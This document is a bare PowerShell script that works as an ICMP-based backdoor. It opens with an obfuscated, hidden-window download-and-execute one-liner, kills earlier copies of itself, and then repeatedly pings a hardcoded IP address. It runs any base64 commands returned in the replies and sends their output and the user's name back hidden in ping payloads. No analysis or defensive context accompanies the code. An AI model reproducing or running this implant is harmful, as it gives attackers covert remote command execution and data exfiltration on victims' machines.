# powershell -w h -nol -noni -ep bypass -enc aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAEMAbABpAGMAawBlAHMAdAAvAGEALwBtAGEAcwB0AGUAcgAvAGkAYwBtAHAAXwBjAGwAaQBlAG4AdAAuAHAAcwAxAHwAaQBlAHgA
Function Invoke-ICMPExfil {
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $true)]
        [String]$Payload,
        [Parameter(Mandatory = $true, Position = 0)]
        [String]$Target,
        [Parameter(Mandatory = $true, Position = 1)]
        [String]$HostName,
        [Parameter()]
        [Int]$MaxSize = 1472
    )

    Begin {
        $ICMPClient = New-Object System.Net.NetworkInformation.Ping
        $PingOptions = New-Object System.Net.NetworkInformation.PingOptions
        $PingOptions.DontFragment = $true

        if ($Payload -eq "") {
            $Payload = "`n" 
        }
    }

    Process {
        0..[math]::floor($Payload.length / $MaxSize) | ForEach-Object {
            $chunk = $Payload.substring($MaxSize * $_, [math]::min($MaxSize, $Payload.length - $MaxSize * $_))
            $json = @{h=$env:USERNAME;d=$chunk} | ConvertTo-Json
            $buff = ([text.encoding]::ASCII).GetBytes($json)
            $ICMPClient.Send($Target, 10, $buff, $PingOptions) | Out-Null
        }
    }

    End { }
}

Function Stop-PreviousProcesses {
    [CmdletBinding()]
    Param ()
        Get-WmiObject win32_process -filter 'name="powershell.exe"' | Select-Object ProcessId, CommandLine | Where-Object {$_.CommandLine -like "*aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAEMAbABpAGMAawBlAHMAdAAvAGEALwBtAGEAcwB0AGUAcgAvAGkAYwBtAHAAXwBjAGwAaQBlAG4AdAAuAHAAcwAxAHwAaQBlAHgA*"} | ForEach-Object { if ($_.ProcessId -ne $PID) { Stop-Process -Id $_.ProcessId -Force } }
}

Stop-PreviousProcesses
$sleep = 10; $target = "104.248.16.121"
while ($true) {
    $ICMPClient = New-Object System.Net.NetworkInformation.Ping
    $json = @{h=$env:USERNAME} | ConvertTo-Json
    $r=$ICMPClient.Send($target, 10, ([text.encoding]::ASCII).GetBytes($json)) 
    $r=[System.Text.Encoding]::ASCII.GetString($r.Buffer)
    if ($r -match "^c:(..*)$") {
        $command = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($matches[1]))
        $out = Invoke-Expression $command 2>&1|out-string
        Invoke-ICMPExfil -Payload $out -Target $target -HostName $env:USERNAME -MaxSize 1000
    }
    start-sleep $sleep
}